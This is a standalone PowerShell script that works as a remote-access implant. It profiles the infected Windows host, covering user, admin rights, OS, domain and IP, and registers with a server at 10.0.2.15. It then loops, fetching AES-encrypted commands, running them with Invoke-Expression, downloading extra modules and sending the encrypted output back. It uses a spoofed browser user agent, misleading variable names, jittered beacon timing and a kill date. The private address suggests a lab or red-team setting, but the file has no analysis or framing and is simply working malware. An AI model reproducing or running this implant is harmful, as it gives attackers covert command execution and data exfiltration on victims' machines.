$exchange=1
function CAM ($key,$SID){

$inc = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
$inc.Mode = [System.Security.Cryptography.CipherMode]::CBC
$inc.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$inc.BlockSize = 128
$inc.KeySize = 256
if ($SID)
{
if ($SID.getType().Name -eq "String")
{$inc.IV = [System.Convert]::FromBase64String($SID)}
else
{$inc.IV = $SID}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$inc.Key = [System.Convert]::FromBase64String($key)}
else
{$inc.Key = $key}
}
$inc}


function ENC ($key,$sserver,$reg=0){
if ($reg -eq 0){
$longitude = [System.Text.Encoding]::UTF8.GetBytes($sserver)}
else{
$longitude=$sserver}
$inc = CAM $key
$key = $inc.CreateEncryptor()
$property = $key.TransformFinalBlock($longitude, 0, $longitude.Length)
[byte[]] $textarea = $inc.IV + $property
[System.Convert]::ToBase64String($textarea)
}


function DEC ($key,$shop,$reg=0){
$longitude = [System.Convert]::FromBase64String($shop)
$SID = $longitude[0..15]
$inc = CAM $key $SID
$d = $inc.CreateDecryptor()
$u = $d.TransformFinalBlock($longitude, 16, $longitude.Length - 16)
if ($reg -eq 0){
[System.Text.Encoding]::UTF8.GetString($u)
}
else{
return $u}
}



function load($invalid)
      {

            $images = enc -key $key -sserver $invalid

            $date = new-object net.WebClient
            $date.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            $date.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")

            try{
              $passwordConfirm = @{mode=$restore;name2=$images}
                $secret=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:80/jboss-net -Method POST -Body $passwordConfirm
		$secret=$secret.Content
            }
            catch{
                $passwordConfirm = "mode=$restore&name2=$images"
                $date = new-object net.WebClient
                $date.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                $date.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
                $secret=$date.UploadString("http://10.0.2.15:80/jboss-net",$passwordConfirm)
                }


            $modulecontent=dec -key $key -shop $secret


      return $modulecontent
      }

$descr = $env:COMPUTERNAME;
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ $ids="*"}
$doc = $env:USERNAME;
$doc ="$ids$doc"
$newuseremail = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$characters = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($newuseremail)";
$newFileName = (Get-WmiObject Win32_ComputerSystem).Domain;
$fetch=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$goodfiles = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$restore="$goodfiles-img.jpeg"

$dbUser="name2=$characters**$fetch**$newuseremail**$descr**$newFileName**$doc**$pid&$goodfiles=$restore"
$date = new-object net.WebClient
      $date.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $date.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$date.UploadString("http://10.0.2.15:80/uddiexplorer",$dbUser)
$sqlite = 'silentlyContinue';

$date = New-Object system.Net.WebClient;
$windows=$restore
while($true){
$u32=[int](Get-Date -UFormat "%s")%97
$ID=Get-Random -Minimum 50 -Maximum 250 -SetSeed $u32
$separator=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count $ID | % {[char]$_});


try{
    $passwordConfirm = @{mode=$restore;token=$separator}
$shop=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:80/wsdl -Method POST -Body $passwordConfirm
$shop=$shop.Content
}
 catch{
$passwordConfirm="mode=$restore&token=$separator"
        $date = new-object net.WebClient
      $date.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $date.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $shop=$date.UploadString("http://10.0.2.15:80/wsdl",$passwordConfirm)
        }



if($shop -eq "REGISTER"){
$date = new-object net.WebClient
      $date.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $date.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$date.UploadString("http://10.0.2.15:80/uddiexplorer",$dbUser)
$sqlite = 'silentlyContinue';
continue
}
$reg=echo $shop | select-string -Pattern "\-\*\-\*\-\*"
if($reg)
#$shop -eq "-")
{
$u32=[int](Get-Date -UFormat "%s")
$counter=[int]$exchange/2+1
$qs=[int]$exchange+1
$exchange=Get-Random -Minimum $counter -Maximum $qs -SetSeed $u32
sleep $exchange
$pf = (Get-Date -Format "dd/MM/yyyy")
$pf = [datetime]::ParseExact($pf,"dd/MM/yyyy",$null)
$u8 = [datetime]::ParseExact("28/09/2022","dd/MM/yyyy",$null)
if ($u8 -lt $pf) {kill $pid}
}
else{
$calendar=dec -key $key -shop $shop



if($calendar.split(" ")[0] -eq "load"){
$property=$calendar.split(" ")[1]
$invalid=load -invalid $property
try{
$CKFinderCommand=Invoke-Expression ($invalid) -ErrorVariable postsperpage | Out-String
        }
        catch{
        $CKFinderCommand = $Error[0] | Out-String;
        }
        if ($CKFinderCommand.Length -eq 0){
        $CKFinderCommand="$CKFinderCommand$postsperpage"
        }


}
else{
try{
$CKFinderCommand=Invoke-Expression ($calendar) -ErrorVariable postsperpage | Out-String
        }
        catch{
        $CKFinderCommand = $Error[0] | Out-String;
        }
        if ($CKFinderCommand.Length -eq 0){
        $CKFinderCommand="$CKFinderCommand$postsperpage"
        }}

  if ($CKFinderCommand.Length -eq 0){
$CKFinderCommand="$CKFinderCommand$postsperpage"
}

$Category=enc -key $key -sserver $CKFinderCommand






 try{
      $passwordConfirm = @{mode=$restore;name2=$Category}
$format=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:80/webserviceclient -Method POST -Body $passwordConfirm
}
 catch{
 $passwordConfirm = "mode=$restore&name2=$Category"
        $date = new-object net.WebClient
      $date.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $date.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $format=$date.UploadString("http://10.0.2.15:80/webserviceclient","POST",$passwordConfirm)
        }

$format=" "
$CKFinderCommand=" "
}
}
